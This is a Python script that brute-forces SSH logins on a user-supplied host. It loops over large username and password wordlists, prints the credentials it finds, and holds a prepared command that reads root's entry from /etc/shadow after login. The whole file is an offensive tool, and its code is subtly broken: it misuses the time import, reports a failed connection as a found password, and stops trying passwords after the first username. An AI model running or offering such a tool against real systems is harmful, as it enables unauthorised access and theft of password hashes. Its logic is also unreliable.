#!/usr/local/bin/python3

from time import time
import pexpect
import timeout_decorator
from termcolor import colored

PROMPT = ['# ', '>> ', '> ', '\$ ', '~$ ', ':~ ', ':~$ ']
LOGO = colored("""

		                       ..:::::::::..
				  ..:::aad8888888baa:::..
			  .::::d:?88888888888?::8b::::.
			.:::d8888:?88888888??a888888b:::.
		  .:::d8888888a8888888aa8888888888b:::.
		 ::::dP::::::::88888888888::::::::Yb::::
		::::dP:::::::::Y888888888P:::::::::Yb::::
	   ::::d8:::::::::::Y8888888P:::::::::::8b::::
	  .::::88::::::::::::Y88888P::::::::::::88::::.
	  :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
	  :::::::Y88888888888P::|::Y88888888888P:::::::
	  ::::::::::::::::888:::|:::888::::::::::::::::
	  `:::::::::::::::8888888888888b::::::::::::::'
	   :::::::::::::::88888888888888::::::::::::::
		:::::::::::::d88888888888888:::::::::::::
		 ::::::::::::88::88::88:::88::::::::::::
		  `::::::::::88::88::88:::88::::::::::'
			`::::::::88::88::P::::88::::::::'
			  `::::::88::88:::::::88::::::'
				 ``:::::::::::::::::::''
					  ``:::::::::'

""", 'red')


def send_command(child, cmd):
	child.sendline(cmd)
	child.expect(PROMPT)
	time.sleep(1)
	print(child.before)

def connect(user, host, password):
	ssh_newkey = 'Are you sure you want to continue connecting'
	connStr = 'ssh ' + user + '@' + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
	if ret == 0:
		print('[-] Error Connecting')
		return
	if ret == 1:
		child.sendline('yes')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
		if ret == 0:
			print(colored('[-] Error Connecting', 'red'))
			return
	child.sendline(password)
	child.expect(PROMPT, timeout=1)
	return child


def main():
	host = input('[*] Enter Host Address: ')	
	userfile = open('/Users/admin/dirBugBountyHunting/SecLists/Usernames/xato-net-10-million-usernames.txt', 'r')
	passfile = open('/Users/admin/dirBugBountyHunting/SecLists/Passwords/xato-net-10-million-passwords.txt', 'r')
	command = 'sudo cat /etc/shadow | grep root;ps'
	timer = time()
	print(LOGO)
	print(colored('###################BRUTE FORCE IN PROGRESS###################\n', 'green'))
	for username in userfile:
		username = username.strip('\n')
		for password in passfile:
			password = password.strip('\n')
			try:
				child = connect(username, host, password)
				print(colored('[+] Username & Password Found: ' + username + ' : ' + password, 'green'))
				print('Total time taken: ', time()-timer, 's')
				return
			except:
				print(colored('[!!]Wrong Username & Password: ' + username + ' : ' + password, 'red'))	

		# send_command(child, command)

if __name__ == '__main__':
	main()
